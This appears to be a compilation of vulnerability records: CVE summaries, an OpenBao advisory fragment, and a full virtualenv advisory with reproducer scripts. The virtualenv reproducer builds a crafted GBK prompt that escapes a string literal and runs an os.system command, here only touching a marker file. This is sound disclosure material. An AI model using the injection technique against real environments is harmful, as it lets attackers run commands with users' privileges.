cves.summary: NetWin dMailWeb and cwMail 2.6g and earlier allows remote attackers to cause a denial of service via a long username parameter.
NtImpersonateClientOfPort local procedure call in Windows NT 4.0 allows local users to gain privileges, aka "Spoofed LPC Port Request."

In CPython 3.13 and earlier, the tarfile module's data and tar extraction filters are vulnerable to crafted archives containing a hard link to a symbolic link. Such archives may cause extraction to modify the permissions or modification time of a file outside the destination directory, or expose the contents of that file within the extracted tree.

mall4j through 4.0 contains an improper authorization vulnerability that allows authenticated storefront customers to delete other shoppers' cart items through an operator precedence error in the cleanExpiryProdList SQL statement. Attackers can send one DELETE request to /p/shopCart/cleanExpiryProdList to remove every user's cart entries for off-shelf products, which do not return when products are restocked.

Wukong AICRM through 20260610 contains a missing authorization vulnerability that allows authenticated users to write into other users' AI chat sessions by supplying an arbitrary sessionId to POST /chat/send. Attackers can append messages to a victim's conversation and receive streamed assistant replies built from the victim's last 20 messages, disclosing conversation content.

Eladmin through 2.7 contains a missing authorization vulnerability in the LocalStorageController uploadPicture handler that allows low-privileged authenticated users to bypass the storage:add permission. Attackers can send POST requests with image-named files to /api/localStorage/pictures to write files into server local storage and disclose absolute server paths.

JeecgBoot through 3.9.5 contains an authorization bypass vulnerability in the getVideoRecords handler of VideoGenerationController that allows authenticated users to read other users' records via the userId parameter. Low-privileged attackers can supply another user id to retrieve their AI video generation history, including prompts, task ids, video URLs and cover URLs.

JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the AiragPromptsController exportXls handler that allows any authenticated user to export all AI prompts. Low-privileged attackers can request /airag/prompts/exportXls to download every user's prompts, including prompt content, model ids, and parameters, as an Excel workbook.

JeecgBoot through 3.9.5 contains a missing authorization vulnerability that allows any authenticated user to read MCP server configurations because the queryById permission check is commented out. Attackers can obtain record ids from the unguarded /airag/app/queryById endpoint and retrieve MCP endpoint URLs, headers, and outbound authentication tokens.

rmuser utility in FreeBSD 4.2 and 4.3 creates a copy of the master.passwd file with world-readable permissions while updating the original file, which could allow local users to gain privileges by reading the copied file while rmuser is running, obtain the password hashes, and crack the passwords.
tkmail before 4.0beta9-8.1 allows local users to create or overwrite files as users via a symlink attack on temporary files.
Buffer overflow in talkd on NetBSD 1.6 and earlier, and possibly other operating systems, may allow remote attackers to execute arbitrary code via a long inbound message.

### Impact

During certain error conditions, OpenBao Agent's exec rendering mode will incorrectly write secrets specified in `env_template` to stdout. This primarily happens when `num_retries` is met.

This vulnerability is original to Vault and was reported via the OpenBao security mailing list.

### Patches

This is addressed in OpenBao v2.6.0 GA.

IBM DB2 7.0 allows a remote attacker to cause a denial of service (crash) via a single byte to (1) db2ccs.exe on port 6790, or (2) db2jds.exe on port 6789.

RealMedia RealServer reveals the real IP address of a Real Server, even if the address is supposed to be private.

## Summary

Caller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence the
value passed to virtualenv, and a user must subsequently activate the environment.

## Affected area

Xonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes can
change how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposure
through unrelated activators.

## Attacker-controlled input

The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated
activation script.

## Affected code

The relevant 21.14.8 source is in
[xonsh quote()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/xonsh/__init__.py),
[UTF-8 template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py).

## Mechanism

The generator writes `activate.xsh` as UTF-8. Its `quote()` used `repr()`, which leaves printable non-ASCII characters
in the file and backslash-escapes an embedded quote. Xonsh's `source` reads the file using `$XONSH_ENCODING`. With GBK
or Big5, the UTF-8 bytes of `中` end in `0xad`, which pairs with the following `0x5c` backslash as one decoded character.
The backslash no longer escapes the quote. A prompt containing both quote kinds can then close its Python string literal
and supply statements that run during activation. With UTF-8 source decoding, the same value stays inside the literal.

## Reproduction and evidence

The original scanner finding, `ANT-2026-PAUVP7YL`, demonstrated this byte-level failure in `activate_this.py`: a hostile
prompt loaded through `exec(open(file).read(), ...)` under GBK created a marker, while UTF-8 and `runpy.run_path`
controls did not. The xonsh path in this advisory was identified in the subsequent maintainer-provided review.
[PR #3432](https://github.com/pypa/virtualenv/pull/3432) shows the xonsh source-decoding chain and changes `quote()` to
`ascii()`, which writes non-ASCII characters as escapes. Its regression test encodes the generated literal as ASCII,
decodes it as GBK, and checks that `ast.literal_eval` returns the original prompt.

The attack needs control of the prompt or destination value, an affected xonsh source encoding, and later sourcing of
the generated file. The original `activate_this.py` reproducer does not itself prove xonsh execution; that result is
attributed to the separate review. Existing `activate.xsh` files must be regenerated after the fix.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prompt supplier
    participant V as virtualenv quote()
    participant F as activate.xsh bytes
    participant X as xonsh source
    A->>V: 中 plus escaped quote and statements
    V->>F: repr writes UTF-8 中 followed by backslash
    alt XONSH_ENCODING is UTF-8
        F->>X: backslash remains an escape
        X-->>A: prompt remains data
    else XONSH_ENCODING is GBK or Big5
        F->>X: decoder consumes backslash as trail byte
        X->>X: quote closes and statements run
    end
    Note over V,X: ascii() emits only ASCII bytes and preserves the literal
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-PAUVP7YL`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import subprocess
import sys
from pathlib import Path
from shutil import rmtree

work = Path("/tmp/activate-this-gbk")
rmtree(work, ignore_errors=True)
work.mkdir()
env_dir = work / "venv"
marker = work / "MARKER"

# set up: a zh_CN.GBK locale, which the image does not ship
subprocess.run([sys.executable, "/tmp/repro.d/install_gbk_locale.py", work / "locales"], check=True)
utf8_session = {"PATH": os.environ["PATH"], "LANG": "C.UTF-8"}
gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": str(work / "locales")}

# attacker: text that a tool relays as --prompt
# the payload's " makes repr() delimit with ' and write the prompt's own ' as \'
# 中 is e4 b8 ad in UTF-8; GBK reads e4 b8 as one character and ad 5c, ad plus that backslash, as the next
payload = f'__import__("os").system("touch {marker}")'
hostile_prompt = "中" + "';" + payload + "#"

# user: creates the environment with the virtualenv command
subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--prompt", hostile_prompt, env_dir], check=True)
activate_this = (env_dir / "bin" / "activate_this.py").read_bytes()
prompt_line = next(line for line in activate_this.splitlines() if line.startswith(b'os.environ["VIRTUAL_ENV_PROMPT"]'))
print(f"activate_this.py read as UTF-8: {prompt_line.decode('utf-8')}")
print(f"activate_this.py read as GBK:   {prompt_line.decode('gbk')}")
assert not marker.exists(), "payload ran at creation time"

# trigger: the same program activates the environment, first in a UTF-8 session, then in a GBK one
activate = [sys.executable, "/tmp/repro.d/activate_with_exec_open.py", env_dir]
control = subprocess.run(activate, env=utf8_session, stdout=subprocess.PIPE, encoding="utf-8", check=True)
ran_in_utf8_session = marker.exists()
print(f"CONTROL  UTF-8 session: {control.stdout.strip()}; {marker} exists: {ran_in_utf8_session}")

observed = subprocess.run(activate, env=gbk_session, stdout=subprocess.PIPE, encoding="gbk", check=True)
ran_in_gbk_session = marker.exists()
print(f"OBSERVED GBK session:   {observed.stdout.strip()}; {marker} exists: {ran_in_gbk_session}")

# check: the prompt is data and must not run in either session
print("BUG" if ran_in_gbk_session and not ran_in_utf8_session else "OK")
```

**`repro.d/activate_with_exec_open.py`**

```text
#!/usr/bin/env python3
# usage: activate_with_exec_open.py ENV_DIR
# A program that activates a virtualenv the way activate_this.py's docstring said to until virtualenv 20.26.2.
import locale
import os
import sys

this_file = os.path.join(sys.argv[1], "bin", "activate_this.py")
exec(open(this_file).read(), {"__file__": this_file})

print(f"open() decodes as {locale.getpreferredencoding(False)}, VIRTUAL_ENV_PROMPT is {os.environ['VIRTUAL_ENV_PROMPT']}")
```

**`repro.d/install_gbk_locale.py`**

```text
#!/usr/bin/env python3
# usage: install_gbk_locale.py LOCPATH
# Does what `locale-gen zh_CN.GBK` would; the image has glibc's localedef but no charmap or locale sources.
import os
import subprocess
import sys

locpath = sys.argv[1]
os.makedirs(locpath)

charmap = ["<code_set_name> GBK", "<comment_char> %", "<escape_char> /", "<mb_cur_min> 1", "<mb_cur_max> 2", "CHARMAP"]
charmap += [f"<U{byte:04X}> /x{byte:02x}" for byte in range(0x80)]
for lead in range(0x81, 0xFF):
    for trail in range(0x40, 0xFF):
        try:
            char = bytes([lead, trail]).decode("gbk")
        except UnicodeDecodeError:
            continue
        charmap.append(f"<U{ord(char):04X}> /x{lead:02x}/x{trail:02x}")
charmap.append("END CHARMAP")
with open(f"{locpath}/GBK.charmap", "w") as charmap_file:
    charmap_file.write("\n".join(charmap) + "\n")

# -c: the source has no LC_TIME, LC_MONETARY, ...; localedef fills in defaults, warns and exits 1, so check the result below
source = "/tmp/repro.d/zh_CN_minimal.locale"
subprocess.run(["localedef", "-c", "-f", f"{locpath}/GBK.charmap", "-i", source, f"{locpath}/zh_CN.GBK"], capture_output=True)

gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": locpath}
codeset = subprocess.run(["locale", "charmap"], env=gbk_session, capture_output=True, text=True, check=True)
if codeset.stdout.strip() != "GBK" or codeset.stderr:
    sys.exit(f"zh_CN.GBK locale not usable: {codeset}")
```

**`repro.d/zh_CN_minimal.locale`**

```text
comment_char %
escape_char /
% Stand-in for glibc's locales/zh_CN: ASCII character classes only. What matters is the codeset name, GBK, which
% comes from the charmap given to localedef with -f.
LC_CTYPE
upper <U0041>..<U005A>
lower <U0061>..<U007A>
digit <U0030>..<U0039>
space <U0009>..<U000D>;<U0020>
cntrl <U0000>..<U001F>;<U007F>
punct <U0021>..<U002F>;<U003A>..<U0040>;<U005B>..<U0060>;<U007B>..<U007E>
xdigit <U0030>..<U0039>;<U0041>..<U0046>;<U0061>..<U0066>
blank <U0009>;<U0020>
END LC_CTYPE
LC_COLLATE
order_start forward
UNDEFINED
order_end
END LC_COLLATE
```

## Impact

An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script
precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The
attack requires control of argument data and subsequent user activation; it does not require replacing an executable or
controlling app-data contents.

## Versions tested

The supplied follow-up review marks command execution as independently confirmed by its author. The implementation
review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation
source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation
of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.

## Known mitigation

Use trusted prompt and destination values. Use UTF-8 source decoding in xonsh on older releases.
Recreate environments with virtualenv 21.14.9 or later.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

The original report was supplied by Anthropic's OSS Scanner as ANT-2026-PAUVP7YL. The subsequent maintainer-provided
review identified the remaining activation path.

## Additional fix branch

[PR #3411](https://github.com/pypa/virtualenv/pull/3411) also uses ASCII-only literals for paths and prompts, alongside
its activation-state changes. Both branches must retain this quoting rule when integrated.

cves.summary: Quake 2 (Q2) server 3.20 and 3.21 allows remote attackers to obtain sensitive server cvar variables, obtain directory listings, and execute Q2 server admin commands via a client that does not expand "$" macros, which causes the server to expand the macros and leak the information, as demonstrated using "say $rcon_password."

Format string vulnerability in (1) Bahamut IRCd 1.4.35 and earlier, and other IRC daemons based on Bahamut including (2) digatech 1.2.1, (3) methane 0.1.1, (4) AndromedeIRCd 1.2.3-Release, and (5) ircd-RU, when running in debug mode, allows remote attackers to cause a denial of service and possibly execute arbitrary code via a request containing format strings.
Buffer overflow in nnrpd program in INN up to version 1.6 allows remote users to execute arbitrary commands.
The WebHits ISAPI filter in Microsoft Index Server allows remote attackers to read arbitrary files, aka the "Malformed Hit-Highlighting Argument" vulnerability.
Microsoft Index Server allows remote attackers to determine the real path for a web directory via a request to an Internet Data Query file that does not exist.
Sample Internet Data Query (IDQ) scripts in IIS 3 and 4 allow remote attackers to read files via a .. (dot dot) attack.
The SyGate Remote Management program does not properly restrict access to its administration service, which allows remote attackers to cause a denial of service, or access network traffic statistics.
Lotus Domino 5.08 and earlier allows remote attackers to cause a denial of service (crash) via a SunRPC NULL command to port 443.

The Kubio AI Page Builder plugin for WordPress is vulnerable to Stored Cross-Site Scripting via kubio/copyright Block Content in all versions up to, and including, 2.8.4 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This bypasses both the WordPress core kses-on-save filter and the plugin's own wp_kses_post() call, because entity-encoded script tags are treated as inert text by kses but are decoded into live HTML by the subsequent html_entity_decode() call in CopyrightBlock::render_template().
Buffer overflows in (1) send_status, (2) kill_print, and (3) chk_fhost in lpd in AIX 4.3 and 5.1 allow remote attackers to gain root privileges.

Citrix MetaFrame 1.8 Server with Service Pack 3, and XP Server Service Pack 1 and earlier, allows remote attackers to cause a denial of service (crash) via a large number of incomplete connections to the server.

PHP remote file inclusion vulnerability in index.php for GONiCUS System Administrator (GOsa) 1.0 allows remote attackers to execute arbitrary PHP code via the plugin parameter to (1) 3fax/1blocklists/index.php; (2) 6departamentadmin/index.php, (3) 5terminals/index.php, (4) 4mailinglists/index.php, (5) 3departaments/index.php, and (6) 2groupd/index.php in 2administration/; or (7) the base parameter to include/help.php.

parse_xml.cgi in Apple Darwin Streaming Server 4.1.1 allows remote attackers to determine the existence of arbitrary files by using ".." sequences in the filename parameter and comparing the resulting error messages.

Renovate before 44.11.3 fails to validate Link header destinations when following GitLab server pagination, allowing malicious servers to redirect credential-bearing requests. Attackers controlling a compromised GitLab server can specify a Link header pointing to attacker-controlled infrastructure to exfiltrate authentication credentials.

The web proxy component in Symantec Enterprise Firewall (SEF) 6.5.2 through 7.0, Raptor Firewall 6.5 and 6.5.3, VelociRaptor, and Symantec Gateway Security allow remote attackers to cause a denial of service (connection resource exhaustion) via multiple connection requests to domains whose DNS server is unresponsive or does not exist, which generates a long timeout.
TNS Listener in Oracle Net Services for Oracle 9i 9.2.x and 9.0.x, and Oracle 8i 8.1.x, allows remote attackers to cause a denial of service (hang or crash) via a SERVICE_CURLOAD command.
Real Networks RealServer 7.x allows remote attackers to cause a denial of service via a malformed request for a page in the viewsource directory.
xterm, Eterm, and rxvt allow an attacker to cause a denial of service by embedding certain escape characters which force the window to be resized.

cwe.name: Exposure of Sensitive Information to an Unauthorized Actor

cves.summary: Buffer overflow in man program in various distributions of Linux allows local user to execute arbitrary code as group man via a long -S option.

Directory traversal vulnerability in IncrediMail version 1400185 and earlier allows local users to overwrite files on the local hard drive by appending .. (dot dot) sequences to filenames listed in the content.ini file.

Internet Explorer 5.5 does not display the Class ID (CLSID) when it is at the end of the file name, which could allow attackers to trick the user into executing dangerous programs by making it appear that the document is of a safe file type.
Maxum Rumpus FTP Server 1.3.3 and 2.0.3 dev 3 stores passwords in plaintext in the "Rumpus User Database" file in the prefs folder, which could allow attackers to gain privileges on the server.

Symantec/AXENT NetProwler 3.5.x contains several default passwords, which could allow remote attackers to (1) access to the management tier via the "admin" password, or (2) connect to a MySQL ODBC from the management tier using a blank password.
Maxum Rumpus FTP Server 1.3.3 and 2.0.3 dev 3 allows a remote attacker to perform a denial of service (hang) by creating a directory name of a specific length.

Certain "programming errors" in the msync system call for FreeBSD 5.2.1 and earlier, and 4.10 and earlier, do not properly handle the MS_INVALIDATE operation, which leads to cache consistency problems that allow a local user to prevent certain changes to files from being committed to disk.

Buffer overflow in 3Com OfficeConnect Remote 812 ADSL Router 1.1.9.4 allows remote attackers to cause a denial of service (reboot or packet loss) via a long string containing Telnet escape characters to the Telnet port.
mopd (Maintenance Operations Protocol loader daemon) does not properly cleanse user-injected format strings, which allows remote attackers to execute arbitrary commands.
